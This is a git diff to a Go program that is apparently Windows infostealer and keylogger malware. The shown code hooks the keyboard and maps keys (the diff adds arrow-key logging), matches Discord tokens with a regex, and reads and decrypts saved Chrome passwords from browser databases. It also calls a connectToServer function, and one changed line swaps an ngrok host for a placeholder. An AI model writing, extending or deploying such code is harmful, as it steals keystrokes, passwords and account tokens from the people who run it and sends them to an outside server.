@@ -14,6 +14,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"os/user"
 	"path/filepath"
 	"regexp"
 	"runtime"
@@ -28,12 +29,12 @@ import (
 	"github.com/lxn/walk"
 	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/types"
-	"golang.org/x/sys/windows"
-	"golang.org/x/sys/windows/registry"
-	_ "modernc.org/sqlite"
 	"github.com/shirou/gopsutil/v4/cpu"
 	"github.com/shirou/gopsutil/v4/host"
 	"github.com/shirou/gopsutil/v4/mem"
+	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
+	_ "modernc.org/sqlite"
 )
 
 var (
@@ -71,6 +72,10 @@ var (
 		"OEM_3":      "`",
 		"SPACE":      "<SPACE>",
 		"BACK":       "<BACK>",
+		"UP":         "<ARROW_UP>",
+		"LEFT":       "<ARROW_LEFT>",
+		"DOWN":       "<ARROW_DOWN>",
+		"RIGHT":      "<ARROW_RIGHT>",
 	}
 
 	REGEX = regexp.MustCompile(`[\w-]{24,26}\.[\w-]{6}\.[\w-]{38}`)
@@ -257,10 +262,8 @@ func browserInfo() {
 			defer rows.Close()
 
 			for rows.Next() {
-				fmt.Println("X")
 				var url, username, encryptedPassword string
 				rows.Scan(&url, &username, &encryptedPassword)
-				fmt.Println("Y")
 				if strings.HasPrefix(encryptedPassword, "v10") {
 					password := decryptData([]byte(strings.TrimPrefix(encryptedPassword, "v10")), extractKey(localPath))
 					if password != "" {
@@ -480,7 +483,7 @@ func main() {
 
 			time.Sleep(time.Millisecond * 200)
 		} else {
-			connectToServer("4.tcp.eu.ngrok.io", 14089)
+			connectToServer("<HOST>", <PORT>)
 		}
 
 	}
